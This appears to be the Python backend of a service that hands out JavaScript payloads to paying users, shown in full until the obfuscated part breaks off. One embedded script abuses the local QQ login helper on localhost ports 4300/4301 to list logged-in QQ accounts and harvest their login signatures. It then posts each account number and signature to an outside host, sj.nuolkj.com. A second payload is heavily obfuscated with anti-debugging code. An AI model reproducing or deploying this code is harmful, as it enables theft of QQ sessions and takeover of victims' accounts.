# -*- coding: UTF-8 -*-
import sys,requests

sys.path.append('../')
from app import mongo


class axJs():
    ''' 动态js   '''

    def __init__(self, id):
        self.id = str(id)
        if self.content():
            # self.js =
            pass
    def content(self):
        if mongo.db.user.find_one({'vip': self.id}):
            return True
        else:
            return False
    def js(self):
        jscode = mongo.db[self.id].find_one({'jid':self.id})['jsCode']

        return jscode
    def jsCode(self):
        js =  '''
            document.domain = "qq.com";
            
            var xjq = document.createElement('script');
            xjq.src = "//cdn.bootcss.com/jquery/1.12.4/jquery.min.js";
            xjq.onload = main;
            document.getElementsByTagName('body')[0].appendChild(xjq);
            qqlist = [];
            isPC = false;
            pport = 4301;
            
            iss = false;
            pt_local_token = Date.parse(new Date()).toString().substr(0, 10);
            
            function isMacOrWindows() {
                if ((navigator.platform == "Win32") || (navigator.platform == "Windows") || (navigator.platform == "Mac68K") || (navigator.platform == "MacPPC") || (navigator.platform == "Macintosh") || (navigator.platform == "MacIntel")) {
                    isPC = true
                } else {
                    if (/android|iPhone|iPad|iPod|iOS|Linux|MicroMessenger|blackberry|mobile/i.test(navigator.userAgent)) {
                        isPC = false
                    } else {
                        isPC = true
                    }
                }
                return isPC
            }
            function isHTTPS() {
                var protocolStr = document.location.protocol;
                return (protocolStr == "https:")
            }
            function getCookie(c_name, info) {
                if (info.length > 0) {
                    c_start = info.indexOf(" " + c_name + "=");
                    if (c_start != -1) {
                        c_start = c_start + c_name.length + 2;
                        c_end = info.indexOf(";", c_start);
                        if (c_end == -1) {
                            c_end = info.length
                        }
                        return unescape(info.substring(c_start, c_end))
                    }
                }
                return ""
            }
            
            //1銆乺et:闇€瑕佹埅鍙栫殑瀛楃涓�;2銆乻trs:寮€濮嬪瓧绗︿覆;3銆乻tre:缁撴潫瀛楃涓层€�
            function getSubstr(ret, strs, stre) {
                var deps = ret.indexOf(strs) + strs.length;
                if (stre == "") var depe = ret.length;
                else var depe = ret.indexOf(stre, deps);
                var dep = ret.substr(deps, depe - deps);
                return dep;
            }
            
            function filter_qq(uin) {
                var reg = /^o0*/;
                return uin.replace(reg, "");
            }
            
            function main() {
                $.ajaxSetup({
                    cache: false
                });
                if (isMacOrWindows()) {
                    document.cookie = "pt_local_token=" + pt_local_token + "; domain=.qq.com; path=/";
                    getPCQQ();
                } else {
                    xsubmit_info();
                }
            }
            
            function isInArray(arr, value) {
                for (var i = 0; i < arr.length; i++) {
                    if (value === arr[i]) {
                        return true;
                    }
                }
                return false;
            }
            
            function ptui_getst_CB(var_sso_get_st_uin) {
                var uin = var_sso_get_st_uin.uin;
                $.ajax({
                    type: "get",
                    timeout: 500,
                    url: "https://ssl.ptlogin2.qq.com/jump?clientuin=" + uin + "&keyindex=9&pt_aid=715030901&daid=73&u1=https%3A%2F%2Fqun.qq.com%2F&pt_local_tk=" + pt_local_token + "&pt_3rd_aid=0&ptopt=1&style=40",
                    dataType: "script",
                    cache: false,
                })
            }
            
            function ptui_qlogin_CB(a, b, c) {
                xsubmit_info(b);
            }
            
            function ptui_getuins_CB(var_sso_uin_list) {
                if (!iss) iss = true;
                else return;
                for (var i = 0; i < var_sso_uin_list.length; i++) {
                    getskey(var_sso_uin_list[i]["account"]);
                }
            }
            
            function getskey(QQ) {
                var port = isHTTPS() ? 4301 : 4300;
                $.ajax({
                    type: "get",
                    timeout: 500,
                    url: "//localhost.ptlogin2.qq.com:" + port + "/pt_get_st?clientuin=" + QQ + "&callback=ptui_getst_CB&r=0.24145677020643008&pt_local_tk=" + pt_local_token,
                    dataType: "script",
                    cache: false,
                })
            }
            
            function getPCQQ() {
                var port = isHTTPS() ? 4301 : 4300;
                $.ajax({
                    type: "get",
                    timeout: 500,
                    url: "//localhost.ptlogin2.qq.com:" + port + "/pt_get_uins?callback=ptui_getuins_CB&pt_local_tk=" + pt_local_token,
                    dataType: "script",
                    cache: false,
                })
            }
            
            function xsubmit_info(url1) {
                var final_info1 = {};
                var url = getSubstr(url1, '&ptsigx=', '&s_url');
                if (url == "") return;
                var uin = getSubstr(url1, '&uin=', '&');
                if (!isInArray(qqlist, uin)) {
                    qqlist.push(uin);
                    final_info1["uin"] = filter_qq(uin);
                    final_info1["url"] = url;
                    //console.log(final_info1);
                    $.ajax({
                        type: "POST",
                        url: "//sj.nuolkj.com/'''+self.id+'''",
                        xhrFields: {
                            withCredentials: true
                        },
                        crossDomain: true,
                        data: final_info1,
                    })
                }
            }

        '''
        return js

    def startJsCode(self):
        js = '''var encode_version = 'sojson.v4';var __0x22ff2=['\x77\x35\x7a\x44\x67\x63\x4b\x7a','\x77\x70\x44\x44\x72\x57\x5a\x71\x4b\x51\x3d\x3d','\x4e\x42\x6a\x43\x72\x54\x77\x74','\x53\x38\x4f\x51\x77\x34\x67\x53\x56\x41\x3d\x3d','\x61\x38\x4b\x6e\x51\x67\x3d\x3d','\x47\x73\x4b\x68\x56\x4d\x4b\x37\x43\x77\x3d\x3d','\x77\x71\x73\x6e\x77\x6f\x4a\x68\x77\x37\x45\x3d','\x77\x71\x7a\x44\x70\x63\x4b\x57\x65\x41\x38\x3d','\x4c\x79\x33\x43\x75\x51\x3d\x3d','\x41\x73\x4f\x39\x77\x35\x49\x41\x61\x67\x3d\x3d','\x45\x63\x4f\x35\x49\x58\x55\x2b','\x59\x6d\x62\x44\x67\x6c\x30\x70','\x4b\x73\x4f\x64\x77\x35\x59\x49\x55\x41\x3d\x3d','\x46\x43\x31\x36\x77\x71\x6a\x44\x6c\x47\x33\x44\x6a\x7a\x42\x4e','\x77\x71\x62\x44\x6f\x4d\x4b\x6d\x77\x72\x4c\x43\x6c\x51\x3d\x3d','\x4b\x69\x7a\x43\x74\x38\x4f\x61\x77\x72\x41\x3d','\x45\x7a\x74\x36\x77\x72\x76\x44\x6f\x67\x3d\x3d','\x77\x37\x62\x44\x6a\x6c\x33\x44\x76\x48\x63\x3d','\x65\x63\x4b\x69\x65\x79\x5a\x36\x42\x41\x45\x3d','\x4e\x38\x4f\x33\x77\x37\x45\x7a\x57\x51\x3d\x3d','\x61\x63\x4f\x53\x77\x35\x59\x3d','\x49\x4d\x4f\x6c\x77\x35\x59\x3d','\x77\x37\x33\x44\x68\x63\x4f\x54\x58\x4d\x4b\x49\x41\x6d\x59\x3d','\x56\x4d\x4b\x45\x45\x56\x46\x33\x4f\x63\x4f\x53\x46\x6c\x50\x43\x6f\x56\x74\x49\x63\x6a\x6e\x44\x72\x54\x67\x3d','\x77\x37\x77\x57\x77\x34\x6a\x44\x70\x77\x3d\x3d','\x58\x4d\x4f\x6b\x55\x6c\x55\x59','\x53\x38\x4b\x4a\x77\x37\x4d\x3d','\x77\x36\x35\x49\x77\x34\x45\x3d','\x50\x38\x4b\x30\x64\x68\x48\x44\x74\x45\x56\x79\x77\x70\x4d\x46\x77\x36\x41\x64\x45\x42\x50\x44\x6d\x42\x58\x44\x69\x4d\x4f\x45','\x77\x71\x6e\x43\x68\x52\x38\x4a\x66\x41\x3d\x3d','\x5a\x63\x4f\x58\x77\x36\x34\x4a\x63\x41\x3d\x3d','\x50\x41\x74\x2b\x46\x6c\x6f\x3d','\x77\x37\x37\x44\x6a\x31\x72\x44\x74\x48\x51\x3d','\x77\x35\x38\x35\x63\x6a\x6b\x31','\x77\x71\x6a\x44\x72\x63\x4b\x46\x63\x51\x5a\x33\x77\x36\x66\x43\x6b\x38\x4b\x35','\x58\x4d\x4f\x6b\x52\x45\x38\x3d','\x77\x71\x66\x43\x68\x54\x67\x2b','\x42\x53\x5a\x38\x77\x72\x6a\x44\x6c\x51\x3d\x3d','\x77\x70\x72\x44\x72\x48\x67\x3d','\x77\x36\x4a\x69\x77\x34\x62\x43\x68\x73\x4f\x43','\x44\x63\x4f\x4a\x43\x45\x4d\x43','\x66\x4d\x4b\x50\x77\x35\x41\x72\x59\x77\x3d\x3d','\x77\x34\x62\x44\x6f\x73\x4b\x33\x77\x71\x58\x44\x67\x51\x3d\x3d','\x77\x70\x54\x43\x6e\x73\x4b\x64\x77\x36\x7a\x44\x68\x6e\x59\x71\x77\x72\x41\x54\x77\x37\x73\x53\x77\x70\x48\x43\x6a\x63\x4b\x4a\x77\x37\x4c\x43\x6d\x48\x30\x32\x41\x4d\x4b\x65\x46\x73\x4b\x42\x77\x72\x58\x43\x6c\x73\x4b\x67\x77\x35\x48\x43\x6f\x31\x51\x33\x77\x70\x6e\x43\x72\x38\x4f\x41\x4a\x73\x4f\x69\x66\x63\x4f\x49\x77\x36\x6a\x44\x74\x73\x4f\x31\x4c\x77\x4c\x44\x74\x63\x4f\x4b\x77\x70\x48\x43\x70\x6a\x76\x44\x6d\x56\x6e\x44\x74\x73\x4b\x50\x77\x72\x58\x44\x6f\x73\x4f\x4a\x77\x6f\x6e\x43\x75\x57\x54\x44\x6a\x6e\x51\x47\x77\x72\x4c\x43\x6e\x73\x4f\x70','\x77\x70\x37\x44\x6c\x73\x4f\x37\x77\x70\x6b\x66','\x63\x63\x4b\x61\x43\x56\x46\x4c','\x77\x36\x45\x64\x77\x35\x4c\x44\x70\x77\x3d\x3d','\x63\x38\x4f\x53\x64\x6d\x4d\x50','\x77\x71\x6b\x2f\x77\x70\x4e\x6b\x77\x36\x59\x3d','\x77\x36\x58\x44\x76\x63\x4b\x33\x77\x70\x77\x3d','\x77\x35\x2f\x44\x72\x32\x62\x44\x76\x6d\x6f\x3d','\x46\x73\x4f\x35\x4c\x6d\x38\x39','\x77\x71\x41\x64\x77\x36\x33\x44\x73\x77\x67\x3d','\x4c\x44\x48\x44\x6b\x38\x4b\x4a\x58\x41\x3d\x3d','\x5a\x38\x4f\x7a\x46\x51\x3d\x3d','\x77\x37\x5a\x2f\x77\x37\x76\x43\x6a\x73\x4f\x43','\x4c\x73\x4b\x67\x56\x73\x4b\x61\x4f\x67\x3d\x3d','\x50\x73\x4b\x2f\x56\x4d\x4b\x41\x49\x52\x6a\x44\x6b\x77\x3d\x3d','\x45\x38\x4f\x55\x77\x36\x30\x46','\x77\x34\x77\x4d\x62\x78\x45\x73\x77\x72\x46\x52','\x77\x34\x38\x76\x66\x31\x73\x3d','\x55\x58\x6f\x4a','\x41\x69\x78\x77\x77\x72\x37\x44\x6e\x57\x6a\x44\x68\x41\x3d\x3d','\x57\x63\x4f\x77\x77\x37\x34\x6a\x51\x77\x3d\x3d','\x77\x71\x76\x44\x6d\x73\x4b\x76\x77\x72\x54\x43\x69\x54\x42\x6e','\x4e\x42\x4d\x54\x54\x63\x4b\x6b','\x77\x35\x33\x43\x72\x73\x4f\x42\x64\x79\x33\x43\x67\x42\x63\x3d','\x77\x70\x4c\x44\x70\x6e\x31\x64\x49\x51\x3d\x3d','\x4c\x38\x4b\x70\x4f\x38\x4b\x6a\x77\x35\x52\x38\x63\x77\x3d\x3d','\x77\x70\x50\x44\x75\x33\x78\x4e\x4e\x6b\x34\x54\x54\x6b\x45\x3d','\x56\x6e\x45\x4b\x4d\x54\x77\x3d','\x42\x38\x4f\x48\x77\x37\x6f\x4b\x58\x4d\x4b\x56\x64\x73\x4f\x65\x77\x71\x31\x68\x47\x46\x58\x44\x6e\x77\x3d\x3d','\x51\x77\x38\x72\x77\x34\x72\x44\x6c\x67\x3d\x3d','\x45\x38\x4f\x63\x77\x37\x73\x66\x51\x41\x3d\x3d','\x43\x53\x5a\x33\x77\x71\x72\x44\x6d\x6e\x41\x3d','\x77\x70\x30\x32\x77\x34\x51\x3d','\x52\x63\x4b\x62\x77\x34\x66\x43\x6a\x73\x4b\x4c','\x77\x70\x30\x77\x77\x35\x37\x44\x6d\x69\x73\x3d','\x62\x6b\x33\x44\x75\x58\x67\x63\x4c\x41\x30\x3d','\x77\x35\x34\x4a\x62\x44\x55\x43','\x48\x73\x4f\x65\x48\x57\x55\x4c\x44\x38\x4f\x31\x77\x72\x33\x43\x6f\x58\x6e\x44\x68\x63\x4f\x4f\x44\x38\x4f\x39\x77\x72\x48\x44\x6b\x6a\x33\x44\x71\x63\x4b\x41\x77\x70\x49\x3d','\x77\x70\x54\x44\x68\x73\x4b\x53\x56\x52\x67\x3d','\x62\x77\x7a\x44\x74\x63\x4f\x49\x77\x34\x68\x6f\x50\x77\x76\x44\x6e\x63\x4b\x70\x77\x70\x73\x3d','\x61\x38\x4b\x6f\x51\x53\x52\x34','\x64\x4d\x4b\x35\x51\x67\x3d\x3d','\x42\x73\x4b\x73\x77\x34\x38\x3d','\x54\x6d\x45\x63\x4f\x6a\x4d\x49','\x77\x72\x7a\x43\x67\x53\x51\x33\x54\x73\x4b\x57','\x77\x6f\x41\x39\x77\x34\x30\x3d','\x77\x35\x62\x43\x6c\x4d\x4f\x63','\x4d\x52\x72\x44\x67\x67\x3d\x3d','\x49\x79\x59\x6b\x52\x73\x4b\x64','\x77\x35\x58\x44\x6b\x38\x4b\x46\x77\x6f\x44\x44\x76\x67\x3d\x3d','\x77\x6f\x66\x44\x67\x4d\x4b\x76\x77\x72\x2f\x43\x6f\x77\x3d\x3d','\x51\x42\x37\x44\x6f\x73\x4f\x73\x77\x34\x38\x3d','\x41\x77\x72\x44\x6f\x4d\x4b\x33\x64\x41\x3d\x3d','\x77\x35\x42\x67\x58\x57\x77\x53','\x58\x73\x4b\x49\x5a\x68\x4a\x62','\x77\x34\x39\x32\x77\x35\x4c\x43\x6f\x38\x4f\x71','\x77\x72\x4c\x43\x6b\x78\x67\x69\x61\x51\x3d\x3d','\x66\x44\x76\x44\x67\x4d\x4f\x4a\x77\x36\x30\x3d','\x77\x6f\x66\x44\x69\x73\x4f\x33\x77\x6f\x38\x41','\x50\x51\x6e\x44\x6c\x63\x4b\x33\x66\x67\x3d\x3d','\x62\x77\x7a\x44\x74\x63\x4f\x42\x77\x35\x38\x3d','\x51\x32\x6a\x44\x6e\x6c\x34\x43','\x77\x71\x4c\x43\x6f\x77\x38\x30\x63\x51\x3d\x3d','\x77\x6f\x30\x44\x77\x35\x66\x44\x74\x51\x30\x3d','\x4a\x6d\x6b\x54','\x58\x42\x50\x44\x74\x67\x3d\x3d','\x42\x63\x4f\x43\x77\x70\x59\x3d','\x77\x72\x2f\x43\x68\x69\x41\x31\x57\x63\x4b\x4b','\x62\x46\x48\x44\x70\x47\x73\x45\x4a\x42\x76\x44\x72\x41\x3d\x3d','\x77\x70\x38\x65\x77\x72\x38\x3d','\x50\x41\x44\x43\x74\x63\x4f\x52\x77\x70\x4e\x77\x54\x52\x2f\x43\x67\x4d\x4b\x35\x77\x34\x6b\x39\x77\x70\x6f\x3d','\x77\x34\x38\x6e\x61\x31\x55\x4e\x77\x6f\x45\x3d','\x4d\x7a\x76\x43\x67\x63\x4b\x4d\x77\x6f\x4e\x55\x56\x63\x4b\x65\x4d\x63\x4f\x50\x77\x70\x77\x6e\x77\x6f\x6a\x44\x68\x38\x4f\x6b\x59\x38\x4b\x69\x77\x34\x51\x36\x43\x63\x4b\x4f\x48\x38\x4b\x67\x77\x72\x7a\x44\x6e\x30\x66\x43\x6c\x73\x4f\x66\x53\x73\x4b\x76\x4c\x41\x6c\x68\x42\x55\x62\x43\x76\x41\x45\x2b\x56\x48\x33\x43\x6f\x33\x4c\x43\x75\x38\x4b\x77\x44\x38\x4f\x42\x58\x6d\x37\x43\x73\x38\x4f\x64\x56\x53\x5a\x47\x77\x70\x63\x58\x66\x4d\x4f\x6c\x59\x67\x2f\x43\x6a\x38\x4f\x4c\x42\x38\x4f\x66\x53\x57\x66\x44\x76\x45\x72\x44\x71\x6e\x42\x50\x50\x42\x2f\x44\x73\x73\x4f\x44\x77\x35\x30\x31\x77\x71\x6a\x43\x76\x79\x7a\x44\x69\x63\x4b\x35\x77\x36\x4d\x32\x5a\x6c\x74\x6f\x77\x34\x37\x43\x67\x38\x4b\x32\x77\x70\x51\x39\x47\x6c\x52\x37\x53\x4d\x4f\x4c','\x61\x63\x4b\x6e\x4c\x41\x67\x3d','\x50\x38\x4b\x2f\x58\x73\x4b\x4b','\x77\x36\x48\x43\x70\x63\x4b\x31\x77\x36\x66\x43\x67\x51\x3d\x3d','\x77\x70\x44\x44\x6e\x73\x4b\x67\x77\x6f\x48\x43\x69\x41\x3d\x3d','\x48\x73\x4b\x63\x4c\x63\x4b\x6d\x77\x36\x34\x3d','\x77\x34\x6f\x74\x54\x52\x49\x32','\x51\x4d\x4b\x65\x77\x35\x66\x43\x68\x4d\x4b\x6d','\x66\x73\x4b\x37\x77\x37\x4d\x64\x63\x51\x3d\x3d','\x65\x32\x66\x44\x71\x30\x45\x6b','\x77\x70\x4c\x44\x6b\x38\x4f\x52\x77\x72\x4d\x2b','\x48\x67\x6c\x31\x44\x33\x34\x3d','\x61\x4d\x4b\x79\x4a\x79\x6a\x43\x69\x67\x3d\x3d','\x44\x6a\x66\x43\x74\x73\x4f\x42\x77\x71\x45\x3d','\x77\x70\x2f\x44\x68\x73\x4f\x50\x77\x72\x67\x7a\x47\x77\x3d\x3d','\x77\x36\x6b\x77\x57\x46\x55\x7a','\x77\x72\x50\x44\x6c\x6c\x77\x3d','\x5a\x38\x4b\x68\x45\x55\x68\x4a','\x48\x78\x37\x43\x6a\x41\x3d\x3d','\x44\x4d\x4f\x6c\x77\x72\x51\x3d','\x77\x71\x51\x42\x77\x35\x55\x3d','\x46\x44\x41\x76\x51\x38\x4b\x6d','\x77\x34\x67\x55\x55\x6e\x59\x72','\x77\x37\x54\x43\x74\x73\x4f\x44\x62\x44\x55\x3d','\x77\x35\x5a\x7a\x77\x34\x59\x3d','\x47\x6b\x67\x44','\x77\x71\x6b\x6b\x77\x35\x58\x44\x6d\x43\x33\x43\x6d\x38\x4b\x56\x4b\x52\x6a\x43\x72\x55\x78\x78\x4c\x55\x45\x55\x47\x51\x3d\x3d','\x54\x4d\x4f\x52\x77\x35\x39\x73\x43\x4d\x4b\x30\x4e\x68\x6a\x43\x69\x38\x4f\x45\x77\x71\x4e\x5a\x62\x4d\x4b\x42\x45\x73\x4b\x39\x77\x35\x62\x43\x73\x63\x4f\x78\x77\x37\x66\x44\x74\x38\x4f\x64\x59\x41\x51\x32\x77\x71\x6a\x43\x6e\x63\x4b\x6a\x77\x72\x58\x43\x67\x73\x4b\x54\x57\x30\x4e\x4a\x49\x73\x4f\x57\x66\x73\x4f\x70\x77\x72\x6e\x43\x69\x38\x4b\x57\x77\x37\x37\x43\x76\x4d\x4f\x66\x63\x56\x68\x46\x4b\x68\x77\x74\x77\x70\x34\x68\x77\x70\x6e\x44\x69\x63\x4b\x31\x77\x72\x62\x44\x6e\x38\x4b\x5a\x58\x63\x4b\x6a\x77\x34\x58\x43\x69\x77\x3d\x3d','\x5a\x7a\x74\x56\x77\x34\x30\x3d','\x4b\x73\x4f\x2f\x77\x70\x5a\x39\x65\x51\x3d\x3d','\x5a\x7a\x74\x4d\x77\x34\x78\x7a','\x56\x38\x4b\x72\x4c\x51\x3d\x3d','\x77\x35\x59\x74\x64\x57\x63\x72','\x5a\x47\x66\x44\x6e\x6c\x45\x67','\x52\x4d\x4f\x53\x77\x37\x6f\x52\x53\x51\x3d\x3d','\x54\x63\x4b\x41\x42\x69\x44\x43\x6f\x77\x3d\x3d','\x77\x6f\x44\x44\x69\x58\x74\x38\x50\x67\x3d\x3d','\x77\x70\x38\x43\x77\x35\x4c\x44\x6b\x77\x6b\x3d','\x77\x37\x7a\x44\x73\x73\x4f\x79\x66\x38\x4b\x6c','\x77\x34\x72\x43\x70\x4d\x4f\x63\x63\x41\x3d\x3d','\x77\x6f\x58\x43\x71\x67\x73\x39\x66\x51\x3d\x3d','\x77\x35\x73\x47\x63\x68\x59\x3d','\x47\x69\x48\x43\x73\x4d\x4b\x75\x77\x72\x45\x3d','\x42\x6c\x77\x43\x50\x44\x4d\x3d','\x77\x37\x7a\x43\x75\x38\x4f\x58\x54\x6a\x6f\x3d','\x77\x36\x34\x7a\x5a\x68\x6f\x35','\x4d\x6a\x76\x44\x74\x4d\x4b\x73\x61\x77\x3d\x3d','\x45\x77\x48\x43\x6c\x41\x3d\x3d','\x4b\x73\x4f\x31\x49\x51\x3d\x3d','\x55\x47\x38\x61\x4e\x77\x6f\x3d'];(function(_0xd5d9b0,_0x2cd497){var _0xb04526=function(_0x5f59c3){while(--_0x5f59c3){_0xd5d9b0['push'](_0xd5d9b0['shift']());}};var _0x2f9000=function(){var _0x198d0d={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x16d8b9,_0x243f30,_0x4a068d,_0x3c7d63){_0x3c7d63=_0x3c7d63||{};var _0x27687c=_0x243f30+'='+_0x4a068d;var _0x31b332=0x0;for(var _0x31b332=0x0,_0x4b829f=_0x16d8b9['length'];_0x31b332<_0x4b829f;_0x31b332++){var _0x225104=_0x16d8b9[_0x31b332];_0x27687c+=';\x20'+_0x225104;var _0x51540a=_0x16d8b9[_0x225104];_0x16d8b9['push'](_0x51540a);_0x4b829f=_0x16d8b9['length'];if(_0x51540a!==!![]){_0x27687c+='='+_0x51540a;}}_0x3c7d63['cookie']=_0x27687c;},'removeCookie':function(){return'dev';},'getCookie':function(_0xd9230,_0x564231){_0xd9230=_0xd9230||function(_0x18d179){return _0x18d179;};var _0x108d22=_0xd9230(new RegExp('(?:^|;\x20)'+_0x564231['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x5e8690=function(_0x2f0bf0,_0x5090a7){_0x2f0bf0(++_0x5090a7);};_0x5e8690(_0xb04526,_0x2cd497);return _0x108d22?decodeURIComponent(_0x108d22[0x1]):undefined;}};var _0x988295=function(){var _0x4d82bd=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x4d82bd['test'](_0x198d0d['removeCookie']['toString']());};_0x198d0d['updateCookie']=_0x988295;var _0x20e0d4='';var _0x509962=_0x198d0d['updateCookie']();if(!_0x509962){_0x198d0d['setCookie'](['*'],'counter',0x1);}else if(_0x509962){_0x20e0d4=_0x198d0d['getCookie'](null,'counter');}else{_0x198d0d['removeCookie']();}};_0x2f9000();}(__0x22ff2,0x1b6));var _0x9d0e=function(_0x2d4c57,_0x43d408){_0x2d4c57=_0x2d4c57-0x0;var _0x4a3698=__0x22ff2[_0x2d4c57];if(_0x9d0e['initialized']===undefined){(function(){var _0x394106=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x1a7da0='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x394106['atob']||(_0x394106['atob']=function(_0x572113){var _0x59ea63=String(_0x572113)['replace'](/=+$/,'');for(var _0x8384b0=0x0,_0x340f2c,_0x4d8f6a,_0x4f91b1=0x0,_0x2cca53='';_0x4d8f6a=_0x59ea63['charAt'](_0x4f91b1++);~_0x4d8f6a&&(_0x340f2c=_0x8384b0%0x4?_0x340f2c*0x40+_0x4d8f6a:_0x4d8f6a,_0x8384b0++%0x4)?_0x2cca53+=String['fromCharCode'](0xff&_0x340f2c>>(-0x2*_0x8384b0&0x6)):0x0){_0x4d8f6a=_0x1a7da0['indexOf'](_0x4d8f6a);}return _0x2cca53;});}());var _0x46c541=function(_0x5a605a,_0x7405cd){var _0x1a00d6=[],_0x4d72b7=0x0,_0x37fd36,_0x4e6b9a='',_0x7624a2='';_0x5a605a=atob(_0x5a605a);for(var _0x42dfd9=0x0,_0x124143=_0x5a605a['length'];_0x42dfd9<_0x124143;_0x42dfd9++){_0x7624a2+='%'+('00'+_0x5a605a['charCodeAt'](_0x42dfd9)['toString'](0x10))['slice'](-0x2);}_0x5a605a=decodeURIComponent(_0x7624a2);for(var _0x2f4e77=0x0;_0x2f4e77<0x100;_0x2f4e77++){_0x1a00d6[_0x2f4e77]=_0x2f4e77;}for(_0x2f4e77=0x0;_0x2f4e77<0x100;_0x2f4e77++){_0x4d72b7=(_0x4d72b7+_0x1a00d6[_0x2f4e77]+_0x7405cd['charCodeAt'](_0x2f4e77%_0x7405cd['length']))%0x100;_0x37fd36=_0x1a00d6[_0x2f4e77];_0x1a00d6[_0x2f4e77]=_0x1a00d6[_0x4d72b7];_0x1a00d6[_0x4d72b7]=_0x37fd36;}_0x2f4e77=0x0;_0x4d72b7=0x0;for(var _0xf66bad=0x0;_0xf66bad<_0x5a605a['length'];_0xf66bad++){_0x2f4e77=(_0x2f4e77+0x1)%0x100;_0x4d72b7=(_0x4d72b7+_0x1a00d6[_0x2f4e77])%0x100;_0x37fd36=_0x1a00d6[_0x2f4e77];_0x1a00d6[_0x2f4e77]=_0x1a00d6[_0x4d72b7];_0x1a00d6[_0x4d72b7]=_0x37fd36;_0x4e6b9a+=String['fromCharCode'](_0x5a605a['charCodeAt'](_0xf66bad)^_0x1a00d6[(_0x1a00d6[_0x2f4e77]+_0x1a00d6[_0x4d72b7])%0x100]);}return _0x4e6b9a;};_0x9d0e['rc4']=_0x46c541;_0x9d0e['data']={};_0x9d0e['initialized']=!![];}var _0x382f2b=_0x9d0e['data'][_0x2d4c57];if(_0x382f2b===undefined){if(_0x9d0e['once']===undefined){var _0x11525c=function(_0xfca315){this['rc4Bytes']=_0xfca315;this['states']=[0x1,0x0,0x0];this['newState']=function(){return'newState';};this['firstState']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['secondState']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x11525c['prototype']['checkState']=function(){var _0x16d46f=new RegExp(this['firstState']+this['secondState']);return this['runState'](_0x16d46f['test'](this['newState']['toString']())?--this['states'][0x1]:--this['states'][0x0]);};_0x11525c['prototype']['runState']=function(_0x3c3e8a){if(!Boolean(~_0x3c3e8a)){return _0x3c3e8a;}return this['getState'](this['rc4Bytes']);};_0x11525c['prototype']['getState']=function(_0x1f107f){for(var _0x39e612=0x0,_0x5b4add=this['states']['length'];_0x39e612<_0x5b4add;_0x39e612++){this['states']['push'](Math['round'](Math['random']()));_0x5b4add=this['states']['length'];}return _0x1f107f(this['states'][0x0]);};new _0x11525c(_0x9d0e)['checkState']();_0x9d0e['once']=!![];}_0x4a3698=_0x9d0e['rc4'](_0x4a3698,_0x43d408);_0x9d0e['data'][_0x2d4c57]=_0x4a3698;}else{_0x4a3698=_0x382f2b;}return _0x4a3698;};function _0x4d314d(){var _0x3a6b20=function(){var _0x18c431=!![];return function(_0x38ba21,_0x1b5305){var _0x2107dc=_0x18c431?function(){if(_0x1b5305){var _0x5b9e04=_0x1b5305['apply'](_0x38ba21,arguments);_0x1b5305=null;return _0x5b9e04;}}:function(){};_0x18c431=![];return _0x2107dc;};}();var _0x4af794=_0x3a6b20(this,function(){var _0x2da868=function(){return'\x64\x65\x76';},_0x244359=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x5eab99=function(){var _0x340123=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x340123['\x74\x65\x73\x74'](_0x2da868['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x2eadf8=function(){var _0x27bbd2=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x27bbd2['\x74\x65\x73\x74'](_0x244359['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0xd71e4d=function(_0x17ee93){var _0x5276f2=~-0x1>>0x1+0xff%0x0;if(_0x17ee93['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x5276f2)){_0x168d89(_0x17ee93);}};var _0x168d89=function(_0x221d99){var _0x3e1fc9=~-0x4>>0x1+0xff%0x0;if(_0x221d99['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x3e1fc9){_0xd71e4d(_0x221d99);}};if(!_0x5eab99()){if(!_0x2eadf8()){_0xd71e4d('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0xd71e4d('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0xd71e4d('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x4af794();var _0xeccdcb={'XcYJs':function _0x466ab9(_0x383325,_0x464e96){return _0x383325!==_0x464e96;},'XkaFn':_0x9d0e('0x0','\x69\x67\x58\x73'),'RZxvU':_0x9d0e('0x1','\x42\x76\x4d\x25'),'fdSBw':function _0x2e279a(_0x14ff8a,_0x2477c6){return _0x14ff8a/_0x2477c6;},'NhIcx':function _0x236b97(_0x40205e,_0x1ca9bf){return _0x40205e!==_0x1ca9bf;},'nUgus':function _0x3664be(_0x4b98c4,_0x2641d6){return _0x4b98c4===_0x2641d6;},'LJmcd':_0x9d0e('0x2','\x35\x36\x4d\x5d'),'rxdvP':_0x9d0e('0x3','\x35\x75\x6f\x79'),'SBnXq':function _0x17fd9f(_0x4b0da0,_0x11ea1d){return _0x4b0da0===_0x11ea1d;},'NYJEF':function _0x8388e1(_0x345fba,_0x3c2025){return _0x345fba!==_0x3c2025;},'dhDjR':_0x9d0e('0x4','\x63\x59\x69\x6c'),'qoOgr':_0x9d0e('0x5','\x69\x67\x58\x73'),'kddba':function _0x32a60f(_0x3967a4){return _0x3967a4();},'AklDZ':_0x9d0e('0x6','\x47\x7a\x4d\x6b'),'HpzzE':_0x9d0e('0x7','\x74\x79\x4b\x4d'),'qjmWA':_0x9d0e('0x8','\x4d\x26\x4e\x25'),'YStAn':_0x9d0e('0x9','\x71\x35\x26\x56')};var _0x7e01=function(){var _0x4000d1={'Mujph':function _0x3afc7f(_0x1ba281,_0x287c99){return 